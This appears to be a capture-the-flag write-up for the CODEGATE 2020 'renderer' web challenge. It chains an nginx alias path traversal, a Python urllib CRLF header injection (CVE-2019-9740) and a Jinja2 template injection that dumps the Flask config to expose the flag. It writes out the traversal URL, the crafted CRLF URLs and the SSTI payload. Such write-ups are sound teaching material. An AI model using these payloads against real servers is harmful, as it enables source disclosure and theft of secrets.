## Challenge: renderer

Challenge is available as a web service on http://110.10.147.169/renderer/. User
is able to send arbitrary URL using POST request. Server retrieves specified URL
and sends contents embedded into some HTML template back to user. Something like
a proxy.

Few files a provided too: [Dockerfile](./challenge/Dockerfile) and
[run.sh](./challenge/settings/run.sh).

### Basic properties

[Dockerfile](./challenge/Dockerfile) is pretty interesting:

```
FROM python:2.7.16

ENV FLAG CODEGATE2020{**DELETED**}

RUN apt-get update
RUN apt-get install -y nginx
RUN pip install flask uwsgi

ADD prob_src/src /home/src
ADD settings/nginx-flask.conf /tmp/nginx-flask.conf

ADD prob_src/static /home/static
RUN chmod 777 /home/static

...
```

Python version immediately attracts attention: Python 2.7 is deprecated, and
`2.7.16` is not even the latest stable version of 2.7 branch.

Second interesting thing: flag seems to be supplied in an environment variable.

Third: web service is using [Flask](https://www.palletsprojects.com/p/flask/)
framework and running under [nginx](https://nginx.org/) +
[uwsgi](https://github.com/unbit/uwsgi).

Paths `/home/src` and `/home/static` are important too, but not in obvious way
at this stage.

[run.sh](./challenge/settings/run.sh) just starts all required services with
right configuration. Nothing interesting.

### First vulnerability

One of my teammates quickly found the first vulnerability: it is possible to
retrieve service's source code using URLs like
`http://110.10.147.169/static../src/run.py`.

There is a known flaw in many nginx configurations: missing trailing slash in
nginx's "location" rule may allow reading files in parent directory. For
example:

```
location /static
{
    alias /home/static/;
}
```

nginx matches first characters - `/static` - and appends the rest to the "alias"
path. So `/staticblah/blah` becomes `/home/static/blah/blah`, and
`/static../blah` becomes `/home/static/../blah` (handled as `/home/blah` by OS).

Now we can download
[complete source code of the service](./service/prob_src/src) (note that it
contains `print`s added by me manually). Enough to even run the same service
locally for further investigation.

### Second vulnerability

[routes.py](./service/prob_src/src/app/routes.py) contains most of the code. It
reveals that service actually provides more than one function:

 * `/` - already known "proxy service";
 * `/whatismyip` - shows user's IP address;
 * `/admin` - writes some info into separate per-request log files;
 * `/admin/ticket` - allows reading of log files.

Certain conditions should be met to trigger different code paths on `/admin` and
`/admin/ticket`: client's IP address equal to `127.0.0.1` or `127.0.0.2`,
specific `User-Agent` string.

Getting `127.0.0.1` as a client's IP address is easy: just request
`http://127.0.0.1/something` from the "proxy service" itself. This is enough to
get `127.0.0.1` in both Flask's `request.remote_addr` and HTTP header
`X-Forwarded-For` added by nginx.

Forging `User-Agent` HTTP header and something other than `127.0.0.1` in
`X-Forwarded-For` is a bit more difficult.

Let's check how "proxy" retrieve content from user-supplied URLs:

```python
def proxy_read(url):
    #TODO : implement logging

    s = urlparse(url).scheme
    if s not in ["http", "https"]: #sjgdmfRk akfRk
        return ""

    return urllib2.urlopen(url).read()
``` 

There is a known bug in `urllib` in some python versions (<= 2.7.16
and <= 3.7.2):
[[CVE-2019-9740] Python urllib CRLF injection vulnerability](https://bugs.python.org/issue36276).

The idea is to supply specially crafted URL to the proxy service. Here is how
normal `urllib2.urlopen()` request looks like (Python 2.7.16):

```
>>> urllib2.urlopen('http://127.0.0.1/test')

# nc -l -p 80
GET /test HTTP/1.1
Accept-Encoding: identity
Host: 127.0.0.1
Connection: close
User-Agent: Python-urllib/2.7

```

With added `\r\n` into the host name field:

```
>>> urllib2.urlopen('http://127.0.0.1/first HTTP/1.1\r\nInjected-Header: xxx/test')

# nc -l -p 80
GET /first HTTP/1.1
Injected-Header: xxx/test HTTP/1.1
Accept-Encoding: identity
Host: 127.0.0.1
Connection: close
User-Agent: Python-urllib/2.7

```

Using this, we may even replace all headers:

```
>>> urllib2.urlopen('http://127.0.0.1/first HTTP/1.1\r\nNew-Header: xxx\r\nAnother-Header: yyy\r\n\r\ngarbage start here')

# nc -l -p 80
GET /first HTTP/1.1
New-Header: xxx
Another-Header: yyy

garbage start here HTTP/1.1
Accept-Encoding: identity
Host: 127.0.0.1
Connection: close
User-Agent: Python-urllib/2.7

```

As "proxy" accepts any `http://` or `https://` URL, this solves our problem
with `User-Agent` and `X-Forwarded-For` validation.

### Final (third) vulnerability

Now we need a way to read the flag from environment variable.

We are able to read service's log files using `/admin/ticket`. Here is the
relevant parts of code:

```python
def read_log(ticket):
    if not (ticket and ticket.isalnum()):
        return False

    if path.exists("/home/tickets/%s" % ticket):
        with open("/home/tickets/%s" % ticket, "r") as f:
            return f.read()
    else:
        return False


@front.route("/admin/ticket", methods=["GET"])
def admin_ticket():
    ...
    if request.args.get("ticket"):
        log = read_log(request.args.get("ticket"))
        if not log:
            abort(403)
        return render_template_string(log)
```

We cannot send arbitrary string as a ticket ID because of `ticket.isalnum()`
check. But service calls Flask's `render_template_string()` directly on string
read from log file. This means that service interprets log files as a
[Jinja2](https://www.palletsprojects.com/p/jinja/) templates.

But first we need a way to inject Jinja2 code to get it executed on the server
side. Fortunately, there is a code path allowing exactly this:

```python
def write_log(rip):
    tid = hashlib.sha1(str(time.time()) + rip).hexdigest()
    with open("/home/tickets/%s" % tid, "w") as f:
        log_str = "Admin page accessed from %s" % rip
        f.write(log_str)
    return tid


def get_real_ip():
    return request.headers.get("X-Forwarded-For") or get_ip()


@front.route("/admin", methods=["GET"])
def admin_access():
    ip = get_ip()
    rip = get_real_ip()
    ...
    if ip != rip: #if use proxy
        ticket = write_log(rip)
        return render_template("admin_remote.html", ticket = ticket)
    ...
```

So it is possible to inject Jinja2 code in `X-Forwarded-For` and then execute it
using `/admin/ticket?ticket=<ID>`.

What Jinja2 code do we need to expose flag? In fact, it is possible to execute
arbitrary Python code from Jinja2 templates, but that is overkill for current
challenge. Here is one line from
[\_\_init\_\_.py](./service/prob_src/src/app/__init__.py):

```python
app.config["FLAG"] = os.getenv("FLAG", "CODEGATE2020{}")
```

It loads flag from the environment variable into Flask's `app.config`. Just
google "jinja2 code injection", the first link:
[Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection).
"Dump all config variables" snippet is the right answer:

```
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```

### The flag

[sol.py](./sol.py) combines all three vulnerabilities in one automated exploit.

Flag: `CODEGATE2020{CrLfMakesLocalGreatAgain}`.
